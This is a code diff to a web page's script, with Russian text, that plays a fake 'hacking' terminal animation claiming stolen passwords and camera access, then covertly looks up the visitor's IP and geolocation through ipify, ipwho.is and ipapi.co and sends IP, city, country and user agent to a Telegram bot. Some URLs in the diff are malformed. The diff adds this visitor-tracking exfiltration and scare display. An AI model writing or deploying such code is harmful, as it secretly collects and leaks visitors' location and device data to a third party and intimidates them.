@@ -44,38 +44,75 @@
             const term = document.getElementById('terminal');
             term.style.display = 'block';
 
-            const lines = ["> [INIT] Взлом...", "> [INFO] Обход защиты...", "> [CRITICAL] Права ROOT получены", "> [DONE] ПОЛНЫЙ ДОСТУП."];
+            
+            const lines = [
+                "> [INIT] Инициализация взлома...", "> [INFO] Поиск открытых портов...",
+                "> [SUCCESS] Порт 8080 открыт", "> [INFO] Обход reCAPTCHA v2...",
+                "> [SUCCESS] Токен верификации получен", "> [INFO] Инжект в процесс lsass.exe...",
+                "> [WARNING] Defender обнаружил активность", "> [SUCCESS] Defender отключен",
+                "> [SYSTEM] Доступ к ядру системы...", "> [CRITICAL] Права ROOT получены",
+                "> [INFO] Сканирование диска C:/...", "> [INFO] Чтение папки %APPDATA%...",
+                "> [SUCCESS] База паролей извлечена", "> [INFO] Доступ к камере получен",
+                "> [INFO] Синхронизация с сервером...", "> [DONE] ПОЛНЫЙ ДОСТУП ПОЛУЧЕН."
+            ];
+
             for (let line of lines) {
-                let p = document.createElement('p'); p.innerText = line; term.appendChild(p);
+                let p = document.createElement('p');
+                p.innerText = line;
+                term.appendChild(p);
                 window.scrollTo(0, document.body.scrollHeight);
-                await new Promise(r => setTimeout(r, 400)); 
+                await new Promise(r => setTimeout(r, 300)); 
             }
 
+            await getTripleData();
+        }
+
+        async function getTripleData() {
+            let ip = "Не определен";
+            let city = "Неизвестно";
+            let country = "";
+
             try {
-           
+                 
                 const ipRes = await fetch(`https://api.ipify.org?format=json`);
                 const ipData = await ipRes.json();
-                const ipv4 = ipData.ip;
+                ip = ipData.ip;
 
-           
-                const geoRes = await fetch(`https://ipwho.is/${ipv4}`);
-                const g = await geoRes.json();
-                const city = g.success ? `${g.city}, ${g.country}` : "Не определен";
+ 
+                try {
+                    const resA = await fetch(`https://ipwho.is/${ip}`);
+                    const dA = await resA.json();
+                    if (dA.success) {
+                        city = dA.city;
+                        country = dA.country;
+                    }
+                } catch(e) {}
 
-                document.getElementById('user-ip').innerText = ipv4;
-                document.getElementById('user-geo').innerText = city;
+             
+                if (city === "Неизвестно") {
+                    try {
+                        const resB = await fetch(`https://ipapi.co{ip}/json/`);
+                        const dB = await resB.json();
+                        city = dB.city || "Неизвестно";
+                        country = dB.country_name || "";
+                    } catch(e) {}
+                }
+
+             
+                document.getElementById('user-ip').innerText = ip;
+                document.getElementById('user-geo').innerText = `${city}, ${country}`;
                 document.getElementById('user-os').innerText = navigator.platform;
 
                 
-                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ipv4}\n🌍 Город: ${city}\n📱 Устройство: ${navigator.userAgent}`;
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+                const msg = `🔥 ПОЛНЫЙ ЛОГ (IPv4)!\n📍 IP: ${ip}\n🌍 Город: ${city}, ${country}\n📱 Устройство: ${navigator.userAgent}`;
+                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
 
             } catch (e) {
-                const backup = `⚠️ Ошибка!\n📱 ${navigator.userAgent}`;
+                const backup = `⚠️ Ошибка!\n📱 ${navigator.userAgent}\n❌: ${e.message}`;
                 await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
             }
 
-            term.style.display = 'none';
+            document.getElementById('terminal').style.display = 'none';
             document.getElementById('leak-box').style.display = 'block';
         }
     </script>
